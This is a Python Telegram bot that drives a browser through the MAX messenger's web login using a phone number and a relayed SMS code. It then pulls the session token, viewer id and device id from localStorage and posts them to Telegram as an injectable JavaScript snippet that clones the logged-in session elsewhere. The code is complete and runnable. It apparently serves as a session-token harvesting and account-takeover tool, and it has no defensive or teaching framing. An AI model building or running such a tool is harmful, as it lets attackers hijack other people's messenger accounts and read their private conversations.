import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from playwright.async_api import async_playwright

TOKEN = ""
URL = "https://web.max.ru/"


bot = Bot(token=TOKEN)
dp = Dispatcher()

user_data = {}

# ---------------------------
# BROWSER START
# ---------------------------

async def start_browser(chat_id: int, phone: str):
    playwright = await async_playwright().start()
    browser = await playwright.chromium.launch(headless=False)

    context = await browser.new_context()
    page = await context.new_page()

    user_data[chat_id]["browser"] = browser
    user_data[chat_id]["context"] = context
    user_data[chat_id]["page"] = page
    user_data[chat_id]["playwright"] = playwright

    await page.goto(URL)
    await page.wait_for_selector('input[type="text"][inputmode="decimal"]')
    await page.fill('input[type="text"][inputmode="decimal"]', phone)
    await page.click('button[type="submit"]')
    await page.wait_for_timeout(2000)

# ---------------------------
# SMS CODE INPUT
# ---------------------------

async def enter_sms_code(chat_id: int, code: str):
    page = user_data[chat_id].get("page")
    if not page:
        return "ERROR"
    await page.wait_for_selector('div.code input')
    inputs = await page.query_selector_all('div.code input')

    if len(inputs) < 6:
        return "ERROR"
    
    for i, digit in enumerate(code[:6]):
        await inputs[i].fill(digit)

    await page.wait_for_timeout(1500)
    text = (await page.content()).lower()

    if "wrong" in text or "invalid" in text or "error" in text:
        return "WRONG"
    
    return "OK"

# ---------------------------
# REPEAT BUTTON CLICK (STABLE)
# ---------------------------
async def repeat_code(chat_id: int):
    page = user_data[chat_id].get("page")

    if not page:
        return False
    msg = await bot.send_message(chat_id, "⏳ Ожидание кнопки...")
    try:
        button = page.locator('button:has-text("Get new code")')

        await button.wait_for(state="visible", timeout=120000)
        await msg.edit_text("✅ Кнопка появилась, нажимаю...")
        await button.click()
        await msg.edit_text("📨 Новый код отправлен")
        return True

    except:
        await msg.edit_text("❌ Кнопка не появилась")
        return False


# ---------------------------
# STOP BROWSER (SAFE)
# ---------------------------
async def stop_browser(chat_id: int):
    try:
        data = user_data.get(chat_id, {})

        if "browser" in data:
            await data["browser"].close()
        if "playwright" in data:
            await data["playwright"].stop()
    except:
        pass

# ---------------------------
# GET LOCAL STORAGE DATA
# ---------------------------

async def get_local_storage_data(page):
    return await page.evaluate("""
        () => ({
            token: localStorage.getItem('token'),
            viewerId: localStorage.getItem('viewerId'),
            device_id: localStorage.getItem('__oneme_device_id')
        })
    """)

# ---------------------------
# WAIT FOR AUTH DATA
# ---------------------------

async def wait_for_auth_data(page, timeout=90):
    for _ in range(timeout):
        data = await page.evaluate("""
            () => ({
                token: localStorage.getItem('token'),
                viewerId: localStorage.getItem('viewerId'),
                device_id: localStorage.getItem('__oneme_device_id')
            })
        """)

        if (
            data.get("token") and data.get("token") != "null" and
            data.get("viewerId") and
            data.get("device_id")
        ):
            return data

        await page.wait_for_timeout(1000)

    return None

# ---------------------------
# IS LOGGED IN
# ---------------------------
async def is_logged_in(page):
    return await page.evaluate("""
        () => {
            return !!(
                localStorage.getItem('token') &&
                localStorage.getItem('viewerId')
            )
        }
    """)

# ---------------------------
# SEND STORAGE TO TELEGRAMM
# ---------------------------

async def send_storage_to_telegram(chat_id: int):
    page = user_data[chat_id].get("page")

    if not page:
        await bot.send_message(chat_id, "❌ Нет страницы")
        return

    data = await wait_for_auth_data(page, timeout=90)

    if not data:
        await bot.send_message(chat_id, "❌ Login не завершён или данные не появились")
        return

    token = data["token"]
    viewerId = data["viewerId"]
    device_id = data["device_id"]

    js_payload = f"""sessionStorage.clear();
localStorage.clear();

localStorage.setItem('__oneme_device_id', '{device_id}');

localStorage.setItem('__oneme_auth', JSON.stringify({{
  token: "{token}",
  viewerId: {viewerId}
}}));

window.location.reload();
"""

    if len(js_payload) > 4000:
        js_payload = js_payload[:4000] + "\n... (обрезано)"

    await bot.send_message(
        chat_id,
        f"📦 SESSION SCRIPT:\n\n```js\n{js_payload}\n```",
        parse_mode="Markdown"
    )

# ---------------------------
# /start
# ---------------------------
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_data[message.chat.id] = {}

    await message.answer(
        "Добро пожаловать в бот по токенам\n\n"
        "комманды для использования: \n"
        "/phone .... (без +7) — ввод номера тел.\n"
        "/code 123456 — ввод кода\n"
        "/repeat — запросить новый код\n"
        "/stop — остановить(желательно после отрабатывания прописывать её)"
        "/manual — Мануал по боту\n"
    )


# ---------------------------
# PHONE
# ---------------------------
@dp.message(Command("phone"))
async def cmd_phone(message: types.Message):
    chat_id = message.chat.id

    parts = message.text.split(maxsplit=1)

    if len(parts) < 2:
        await message.answer("Используй: /phone 9991234567")
        return

    phone = parts[1]
    user_data[chat_id] = {"phone": phone}

    await message.answer("🚀 Открываю браузер...")

    await start_browser(chat_id, phone)


    await message.answer("📲 Номер введён. Теперь /code")

# @dp.message(Command("phone"))
# async def cmd_phone(message: types.Message):
#     chat_id = message.chat.id

#     parts = message.text.split(maxsplit=1)
#     if len(parts) < 0:
#         await message.answer("Используй: /phone 9991234567")
#         return

#     phone = parts[1]
#     user_data[chat_id] = {"phone": phone}

#     await message.answer("🚀 Открываю браузер...")

#     await start_browser(chat_id, phone)

#     await message.answer("📲 Номер введён. Теперь /code")

# ---------------------------
# CODE
# ---------------------------
@dp.message(Command("code"))
async def cmd_code(message: types.Message):
    chat_id = message.chat.id

    if chat_id not in user_data:
        await message.answer("Сначала /phone")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Используй: /code 123456")
        return

    code = parts[1]

    await message.answer("⌨️ Ввожу код...")

    result = await enter_sms_code(chat_id, code)

    if result == "OK":
        await message.answer("✅ Код подошёл")
        await send_storage_to_telegram(chat_id)
    elif result == "WRONG":
        await message.answer("❌ Код неверный")
    else:
        await message.answer("⚠️ Ошибка")

# ---------------------------
# MANUAL 
# ---------------------------

@dp.message(Command("manual"))
async def cmd_manual(message: types.Message):
    chat_id = message.chat.id

    if chat_id not in user_data:
        await message.answer("Сначала /start")
        return
    await message.answer(
        "Manual по боту\n\n"
        "Мануал еще не написан...."
    )

# ---------------------------
# REPEAT
# ---------------------------
@dp.message(Command("repeat"))
async def cmd_repeat(message: types.Message):
    chat_id = message.chat.id

    if chat_id not in user_data:
        await message.answer("Нет сессии")
        return

    await repeat_code(chat_id)


# ---------------------------
# STOP
# ---------------------------
@dp.message(Command("stop"))
async def cmd_stop(message: types.Message):
    chat_id = message.chat.id

    await stop_browser(chat_id)

    user_data.pop(chat_id, None)

    await message.answer("🛑 Остановлено")


# ---------------------------
# RUN
# ---------------------------
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())